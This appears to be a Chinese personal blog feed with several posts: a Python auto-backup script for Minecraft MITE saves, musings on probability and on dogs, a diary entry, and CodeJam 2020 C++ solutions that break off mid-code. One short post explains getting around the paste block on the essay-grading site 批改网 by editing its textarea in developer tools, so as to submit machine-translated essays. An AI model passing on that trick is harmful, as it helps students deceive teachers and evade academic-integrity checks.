        <content type="html"><![CDATA[<p>最近玩MITE(minecraft is too easy)前期老是被小白两箭搞死，每次探矿还要手动备份，一忘记备份就很难受，所以写了个自动备份的脚本 -，-<br>路径看情况改一下吧，MITE简直就是恐怖游戏，里面的怪物AI有点强..搞阴的那一套wocao</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line">backup_version = <span class="number">10</span> <span class="comment"># 保存版本数</span></span><br><span class="line">backup_time = <span class="number">60</span> * <span class="number">3</span> <span class="comment"># 存档时间(second)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    q=Queue(maxsize=backup_version)</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">        now = datetime.datetime.now()</span><br><span class="line">        original_folder = <span class="string">'MITE Plus R5/.minecraft/MITE/saves/1.6.4/极其险恶的世界1'</span></span><br><span class="line">        target_folder = <span class="string">'bf/极其险恶的世界1'</span>+str(now.strftime(<span class="string">'%Y%m%d%H%M%S'</span>))</span><br><span class="line">        shutil.copytree(original_folder, target_folder)</span><br><span class="line">        print(str(now.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>) + <span class="string">': backup success! -- '</span> + target_folder))</span><br><span class="line"></span><br><span class="line">        q.put(target_folder)</span><br><span class="line">        <span class="keyword">if</span> q.full():</span><br><span class="line">            delete_folder = q.get()</span><br><span class="line">            shutil.rmtree(delete_folder, <span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">        i = backup_time</span><br><span class="line">        <span class="keyword">while</span> (i&gt;<span class="number">0</span>):</span><br><span class="line">            print(<span class="string">'\r next backup time left: %3d'</span> %(i), end=<span class="string">''</span>)</span><br><span class="line">            i-=<span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> misc </tag>
            
            <tag> minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>f**k 批改网</title>
      <link href="/blog/misc-fuck-pi-gai-wang/"/>
      <url>/blog/misc-fuck-pi-gai-wang/</url>
      
        <content type="html"><![CDATA[<p>我经常直接翻译作文，但是批改网粘贴不了，很简单的方法就是F12找到那个<code>&lt;textarea&gt;</code>的标签，直接粘贴进去就ok了…</p><video id="video" controls preload="none" width="600px">    <source id="mp4" src="/img/misc-fuck-pi-gai-wang/fuck-pi-gai-wang.mp4" type="video/mp4"></video>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>令人迷惑的概率</title>
      <link href="/blog/misc-confused-probability/"/>
      <url>/blog/misc-confused-probability/</url>
      
        <content type="html"><![CDATA[<p>最近看一个抽好友标识卡片的文章，它说“每次都抽一个位置的抽到的概率会大一些”。</p><p>我想学过概率的都不会这么说的吧hhh，每次事件是独立的，无论哪次抽到的概率自然也都是一样的。</p><p>但是我们经常会出现这种错觉。</p><p>假设有6个元素，其中一个有我们想要的，每次我们抽到他的概率就是$\frac{1}{6}$，在每个位置抽到的概率都是一样的，所以都是$\{\frac{1}{6}, \frac{1}{6}, \frac{1}{6}, \frac{1}{6}, \frac{1}{6}, \frac{1}{6}\}$</p><p>但如果我们在第一次在第一个位置没抽到，那么我们再抽第一个位置抽不到的概率就是$\frac{5}{6}\times \frac{5}{6}$，2333</p><p>要是这么计算的话，在第一个位置抽打的概率就是$\frac{1}{6}\times \frac{1}{6}$，hhh</p><p>没什么意思的文章完了，精彩。</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> probability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200404</title>
      <link href="/blog/20200404/"/>
      <url>/blog/20200404/</url>
      
        <content type="html"><![CDATA[<p>虽然有些不太合适，但是看了这个图真的好想笑<br><img src="/img/20200404/20200404192100.jpg" alt><br>可能CSDN是为数不多的把整个网站全变灰的了..太实诚了，别的网站都是只有首页灰色，甚至首页随便加点东西就不是灰色了…</p><p>这篇文章将会在20200405push到博客上去…</p><p>最近的事情是真的多<br>很多都是之前拖拖拉拉的，越堆越多，我决定这个周末清理一波</p><p>最近对Madliyn真的是光速被圈粉然后光速被退粉，因为听了几首歌的原唱，她把原唱的背景和意境忽略了，成了单纯的炫音，然后我就退粉了<br>J.Fla的歌还挺好听的hhh，为她的15,000,000粉成就做了贡献233</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论狗生</title>
      <link href="/blog/misc-lun-gou-sheng/"/>
      <url>/blog/misc-lun-gou-sheng/</url>
      
        <content type="html"><![CDATA[<p>忽然有了一个奇怪的想法233</p><hr><p>想想人的出身，有的人出身高贵，有的人出身寒酸。出身条件就好的人，往往会意识不到自己的条件，其实往往那些条件有些并非经济原因，更多的是不会为琐事烦恼。这样带来最大的收益也便是时间。我不是个有钱人，我也不是一个家庭条件很富裕的人，我说的一些例子并不一定适用于所有人。但是以我的拙见，举个简单的例子，有些人选择手机或者电脑一类的科技产品甚至不会去考虑什么，买名牌高配，就这么简单，而有些人便会因为一点点的小差别而逛遍多家店铺，然后计算一下节日优惠，优惠力度一类的。我选购我这电脑的时候便是这样，神舟自然性价比高，这几乎毋庸置疑，GTX 1660Ti或者GTX 1650是我想要的显卡，以此条件找依然会有很多很多类似的产品，差别仅仅是：显示器、CPUi7-9750,i5-9300、内存8g\16g一类细微的差别，然后再去均衡一下条件，做一下改动什么的。似乎有些跑题..</p><p>但是人的出身不能决定一切对吧，但是狗好像不是这样的。</p><p>狗的出身决定了它的一生将如何度过。</p><p>一只土狗注定不会享受富养的待遇，一只血种纯正的喜乐蒂牧羊犬注定不会被随便消费。</p><p>即使有些狗做出了努力，会了一些技能，可是结果也是被人消费，如果像是进入马戏团一类的，可能反而会有反效果。</p><p>所以说，狗真的是很悲哀，自己从出生的那一刻起就可能已经决定它的一生该如果度过了。</p><p>你不是狗，所以请放心努力^^</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeJam 2020 Qualification Round</title>
      <link href="/blog/problem-codejam-2020-qualification-round/"/>
      <url>/blog/problem-codejam-2020-qualification-round/</url>
      
        <content type="html"><![CDATA[<p>嗝，感谢Google给我发的邮件让我在404不再寂寞。<br>就做了3道题，30pts就能拿到资格<br>但前面的很简单，随便水水..后面的题自然是最喜欢的口胡<br>——20200404</p><hr><h2 id="Vestigium-7pts"><a href="#Vestigium-7pts" class="headerlink" title="Vestigium 7pts"></a>Vestigium 7pts</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>计算矩阵对角线左上到右下的和，计算出现重复元素的行数和列数</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>…没啥好说的$O(n^4)$似乎都能过</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">205</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N][N];</span><br><span class="line"><span class="keyword">int</span> num[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, k, r, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;T);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i][j]);</span><br><span class="line">        k = r = c = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) k+=a[i][i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="keyword">sizeof</span>(num));</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) num[a[i][j]]++;</span><br><span class="line">            <span class="keyword">int</span> fl = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) <span class="keyword">if</span>(num[j]&gt;<span class="number">1</span>) fl=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(fl) r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) &#123;</span><br><span class="line">            <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="keyword">sizeof</span>(num));</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) num[a[i][j]]++;</span><br><span class="line">            <span class="keyword">int</span> fl = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="keyword">if</span>(num[i]&gt;<span class="number">1</span>) fl=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(fl) c++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %d %d %d\n"</span>, t, k, r, c);</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nesting-Depth-5pts-11pts"><a href="#Nesting-Depth-5pts-11pts" class="headerlink" title="Nesting Depth 5pts 11pts"></a>Nesting Depth 5pts 11pts</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>一个序列，让你添加括号，使得每个数被嵌套的括号数量恰好是他这个数。</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>就很简单的构造-，-</p><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">150</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n; <span class="built_in">string</span> s, res;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T; getline(<span class="built_in">cin</span>, s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        res=<span class="string">""</span>;</span><br><span class="line">        getline(<span class="built_in">cin</span>, s);</span><br><span class="line">        n = s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) a[i]=s[i<span class="number">-1</span>]-<span class="string">'0'</span>;</span><br><span class="line">        n; a[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i) res+=a[i]+<span class="string">'0'</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=a[i]-a[i+<span class="number">1</span>]; j++) res+=<span class="string">')'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;a[i+<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=a[i+<span class="number">1</span>]-a[i]; j++) res+=<span class="string">'('</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; t &lt;&lt; <span class="string">": "</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Parenting-Partnering-Returns-7pts-12pts"><a href="#Parenting-Partnering-Returns-7pts-12pts" class="headerlink" title="Parenting Partnering Returns 7pts 12pts"></a>Parenting Partnering Returns 7pts 12pts</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>两个人干活，有每个活的起始和结束时间，让你分配个方案，判断一下可不可能</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>排序一下直接贪心就好了…<br>简单想一下，如果两个人都有空那么随便安排一个就可以；如果只有一个人有空，那么只能让另一个人；如果都没空自然不可以。</p><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xx first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> yy second</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1050</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mypr</span> &#123;</span> <span class="keyword">int</span> x, y, id; &#125; a[N];</span><br><span class="line"><span class="keyword">int</span> b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> mypr &amp;a, <span class="keyword">const</span> mypr &amp;b)</span> </span>&#123; <span class="keyword">return</span> a.x==b.x?a.y&lt;b.y:a.x&lt;b.x; &#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; a[i].x &gt;&gt; a[i].y; a[i].id = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(b, <span class="number">0</span>, <span class="keyword">sizeof</span>(b));</span><br><span class="line">        sort(a+<span class="number">1</span>, a+n+<span class="number">1</span>, cmp);</span><br><span class="line">        <span class="keyword">int</span> avj=<span class="number">0</span>, avc=<span class="number">0</span>, fl=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(avj&lt;=a[i].x) &#123;</span><br><span class="line">                b[a[i].id]=<span class="number">1</span>;</span><br><span class="line">                avj = a[i].y;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(avc&lt;=a[i].x) &#123;</span><br><span class="line">                b[a[i].id]=<span class="number">0</span>;</span><br><span class="line">                avc = a[i].y;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fl=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(fl) <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; t &lt;&lt; <span class="string">": IMPOSSIBLE"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">string</span> aa = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="keyword">if</span>(b[i]) aa+=<span class="string">"J"</span>; <span class="keyword">else</span> aa+=<span class="string">"C"</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; t &lt;&lt; <span class="string">": "</span> &lt;&lt; aa &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ESAb-ATAd-1pts-9pts-16pts"><a href="#ESAb-ATAd-1pts-9pts-16pts" class="headerlink" title="ESAb ATAd 1pts 9pts 16pts"></a>ESAb ATAd 1pts 9pts 16pts</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>交互题。有一个01序列，每10问会发生一次变化，可能是01翻转，可能是序列翻转，可能01翻转然后序列翻转，可能不变，每次询问告诉你那个位的数是多少</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>我觉得只需要记4个数，（第1个和第2个）（0和1），然后先花两次询问来查看变化，然后在询问剩下的就ok<br>（当然这是口胡的，我没写</p><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><p>None</p><h2 id="Indicium-7pts-25pts"><a href="#Indicium-7pts-25pts" class="headerlink" title="Indicium 7pts 25pts"></a>Indicium 7pts 25pts</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>第一题差不多的定义，就是构造一个自然拉丁方让对角线的值是$k$，$n\leqslant 50$</p><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>首先就想到了一个式子$\sum a_i=n, \sum ia_i=k$，其中$a_i\geqslant 2 \text{ or } a_i=0$，有这个自然数解，也就有解<br>有两个问题…一个是这个复杂度好像很玄学..<br>还有就是构造的时候遇到了问题..优先级似乎是分开的…不是很懂了，有空再做吧我去写实验了..</p><h3 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">55</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N][N], row[N][N], col[N][N];</span><br><span class="line"><span class="keyword">int</span> b[N], inq[N];</span><br><span class="line"><span class="keyword">int</span> q1[N], q2[N];</span><br><span class="line"><span class="keyword">int</span> T, n, k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getans</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> k==<span class="number">0</span>?<span class="number">1</span>:<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(k%n==<span class="number">0</span>) &#123; q1[++q1[<span class="number">0</span>]]=k/n; q2[q1[<span class="number">0</span>]]=n; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;n) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k/n; i&gt;<span class="number">0</span>; i--) &#123;</span><br><span class="line">        q1[++q1[<span class="number">0</span>]]=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=min(n, k/i); j&gt;=<span class="number">2</span>; j--) &#123;</span><br><span class="line">            q2[q1[<span class="number">0</span>]]=j;</span><br><span class="line">            <span class="keyword">int</span> t=getans(k-i*j, n-j);</span><br><span class="line">            <span class="keyword">if</span>(t==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        --q1[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=T; t++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="keyword">sizeof</span>(a)); <span class="built_in">memset</span>(row, <span class="number">0</span>, <span class="keyword">sizeof</span>(row)); <span class="built_in">memset</span>(col, <span class="number">0</span>, <span class="keyword">sizeof</span>(col));</span><br><span class="line">        <span class="built_in">memset</span>(b, <span class="number">0</span>, <span class="keyword">sizeof</span>(b)); <span class="built_in">memset</span>(inq, <span class="number">0</span>, <span class="keyword">sizeof</span>(inq));</span><br><span class="line">        q1[<span class="number">0</span>]=q2[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: "</span>, t);</span><br><span class="line">        <span class="keyword">if</span>(getans(k, n)==<span class="number">-1</span>) <span class="built_in">puts</span>(<span class="string">"IMPOSSIBLE"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"POSSIBLE"</span>);</span><br><span class="line"><span class="comment">//for(int i=1; i&lt;=q1[0]; i++) cout &lt;&lt; q1[i] &lt;&lt; " x " &lt;&lt; q2[i] &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=q1[<span class="number">0</span>]; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=q2[i]; j++) &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    a[cnt][cnt]=q1[i];</span><br><span class="line">                    row[cnt][q1[i]]=<span class="number">1</span>, col[cnt][q1[i]]=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=q1[<span 